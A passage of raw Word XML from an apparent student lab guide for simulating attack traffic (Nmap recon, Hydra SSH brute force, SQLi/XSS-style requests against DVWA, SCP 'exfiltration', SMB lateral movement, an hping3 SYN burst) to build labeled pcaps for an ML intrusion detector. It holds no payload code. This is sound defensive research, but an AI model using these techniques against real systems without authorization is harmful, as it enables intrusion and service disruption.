        <w:t>The web attack class sends SQL injection-style and XSS-style requests against a vulnerable web path such as DVWA on Metasploitable. If DVWA requires login cookies in your setup, you can still use the script to generate suspicious HTTP requests, or you can manually browse DVWA/Juice Shop while packet capture is running.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>10.5 Exfiltration</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The exfiltration class uses SCP to create file-transfer traffic. The script performs both upload-style and pull-style transfers with harmless sample files. The pull-style action better represents exfiltration direction because the attacker machine retrieves a file from the target. No real sensitive data should be used.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>10.6 Lateral Movement</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The lateral movement class simulates internal movement behavior using SMB enumeration and SSH access. This is a simplified representation suitable for a one-week project. A more advanced future version could include Active Directory, Windows event logs, and MITRE ATT&amp;CK Atomic Red Team tests.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>10.7 Controlled DoS-like Traffic</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The DoS class uses hping3 to generate a small SYN burst. This should remain low-volume and lab-only. The objective is not to crash Metasploitable or overload VCloud; it is to create a recognizable short burst of SYN traffic for ML labeling.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>11. Dataset Labeling Plan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The script writes a CSV label log to ./logs/attack-labels.csv. This log can help you align packet-capture time windows with the traffic class that was running. For the ML stage, each time range can be mapped to a class label.</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Pr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Script Option</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
            <w:shd w:fill="D9EAF7"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>ML Label</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5760"/>
            <w:shd w:fill="D9EAF7"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Main Evidence in Traffic</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3312"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>1. Generate Normal Traffic</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Normal</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5760"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>DNS lookups, HTTP HEAD/GET requests, one normal SSH login.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3312"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>2. Reconnaissance</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Recon</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5760"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Ping sweep, SYN scan, version enumeration.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3312"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>3. Brute Force</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Brute Force</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5760"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Repeated SSH authentication attempts.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3312"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>4. Web Attack</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Web Attack</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5760"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>HTTP requests with SQLi/XSS-style parameters.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3312"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>5. Exfiltration</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Exfiltration</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5760"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>SCP file transfer sessions.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3312"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>6. Lateral Movement</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Lateral Movement</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5760"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>SMB enumeration and internal SSH activity.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3312"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>7. Controlled DoS-like SYN Burst</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>DoS</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5760"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Short burst of SYN packets to port 80.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:r>
        <w:t>Suggested capture naming convention:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>normal_traffic.pcap</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>recon_nmap.pcap</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>bruteforce_hydra_ssh.pcap</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>web_sqli_xss.pcap</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>exfil_scp.pcap</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>lateral_smb_ssh.pcap</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>dos_syn_burst.pcap</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>12. Troubleshooting</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rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Problem</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
            <w:shd w:fill="D9EAF7"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Likely Cause</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
            <w:shd w:fill="D9EAF7"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Fix</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2592"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Hydra fails immediately</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>SSH not reachable or wrong credentials/username variable.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Run nmap -sV TARGET_IP and verify port 22 is open.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2592"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>DVWA curl requests do not show expected page</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>DVWA may require login cookies or security level configuration.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Use the requests for traffic generation or manually browse DVWA/Juice Shop during capture.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2592"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>smbclient returns connection errors</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Windows SMB may be disabled or firewall blocks SMB.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Enable SMB sharing only inside the lab or treat this class as optional.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2592"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>hping3 does not run</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Root privileges required or tool missing.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Run sudo apt install hping3 and execute script with sudo when selecting DoS.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2592"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>ML labels are mixed</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Multiple classes were run without pauses or separate captures.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Run one class at a time or use the attack-labels.csv timestamp log.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>13. One-Week Priority Plan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Because the deadline is one week, prioritize a clean and demonstrable result over too many attack categories. The strongest minimum viable attack-end is:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>1. Normal traffic baseline.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>2. Reconnaissance with Nmap.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>3. Brute force with Hydra against SSH.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>4. Web attack requests against DVWA/Juice Shop or Metasploitable web paths.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>5. SCP file transfer for exfiltration simulation.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Add lateral movement and controlled DoS only after the first five classes work reliably and are captured cleanly.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>14. References Consulted</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>These references were consulted to keep the guide aligned with current tool purposes and documentation. They are included for your GitHub README and professor review.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Nmap Reference Guide: </w:t>
      </w:r>
      <w:r>
        <w:t>https://nmap.org/book/man.html</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">THC Hydra GitHub Repository: </w:t>
      </w:r>
      <w:r>
        <w:t>https://github.com/vanhauser-thc/thc-hydra</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">OWASP Juice Shop Project: </w:t>
      </w:r>
      <w:r>
        <w:t>https://owasp.org/www-project-juice-shop/</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Zeek Network Security Monitor: </w:t>
      </w:r>
      <w:r>
        <w:t>https://zeek.org/</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">CICFlowMeter - Canadian Institute for Cybersecurity: </w:t>
      </w:r>
      <w:r>
        <w:t>https://www.unb.ca/cic/research/applications.html</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Wireshark User Guide: </w:t>
      </w:r>
      <w:r>
        <w:t>https://www.wireshark.org/docs/wsug_html_chunked/</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">tcpdump capture guidance in Wireshark User Guide: </w:t>
      </w:r>
      <w:r>
        <w:t>https://www.wireshark.org/docs/wsug_html_chunked/AppToolstcpdump.html</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Lab-only guide for authorized VCloud environment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AI Network Manager Project - Full Attack Simulation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